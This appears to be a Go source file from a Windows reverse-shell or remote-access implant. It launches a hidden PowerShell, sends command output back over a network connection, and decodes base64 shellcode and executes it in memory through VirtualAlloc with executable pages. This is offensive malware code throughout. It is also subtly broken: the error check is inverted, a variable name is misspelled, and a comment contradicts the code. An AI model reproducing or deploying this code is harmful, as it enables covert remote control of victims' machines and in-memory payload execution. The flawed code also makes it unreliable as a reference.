// +build windows !linux !darwin !freebsd

package main

import (
	"encoding/base64"
	"net"
	"os/exec"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

// GetShell returns a shell command
func GetShell() *exec.Cmd {
	cmd := exec.Command("C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd
}

// ExecuteCmd executes a given command
func ExecuteCmd(command string, conn net.Conn) {
	cmd_path := "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"
	cmd := exec.Command(cmd_path, "/c", command+"\n")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

// InjectShellcode decodes base64 encoded shellcode and inject it in the same process
func InjectShellCode(encShellcode string) {
	if encShellcode != "" {
		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err != nil {
			go ExecShellCode(shellcode)
		}
	}
}

// ExecShellcode sets the memory page containing the shellcode to R-X, then execute shellcode as a function
func ExecShellCode(shellcode []byte) {
	// Resolve kernell32.dll, and VirtualAlloc
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	// Reserve space to drop shellcode
	address, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	addrPtr := (*[990000]byte)(unsafe.Pointer(address))
	for i, value := range shellcode {
		addPtr[i] = value
	}

	go syscall.Syscall(address, 0, 0, 0, 0)
}
